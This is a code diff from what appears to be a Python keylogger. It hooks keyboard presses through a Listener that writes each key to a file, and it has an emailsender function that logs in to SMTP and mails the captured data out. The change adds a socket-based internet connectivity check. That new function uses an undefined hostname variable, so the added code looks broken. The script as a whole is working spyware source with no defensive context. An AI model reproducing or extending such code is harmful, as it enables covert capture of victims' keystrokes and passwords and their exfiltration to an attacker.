@@ -8,7 +8,8 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
-import tempfile #3
+import socket #3
+import tempfile
 
 # functions
 def writetofile(key):
@@ -50,7 +51,17 @@ def emailsender():
     smtpobj.login(fromadd ,'my_password') # add password 
     text = msg.as_string()
     smtpobj.sendmail(fromadd , toadd , text)
-    smtpobj.quit()        
-
+    smtpobj.quit() 
+    
+def is_connected(): 
+    try:
+        host = socket.gethostbyname(hostname)
+        s = socket.create_connection((host, 80), 2)
+        s.close()
+        print(True)
+    except:
+        pass
+        print(False)
+        
 with Listener(on_press=writetofile) as l:
     l.join()
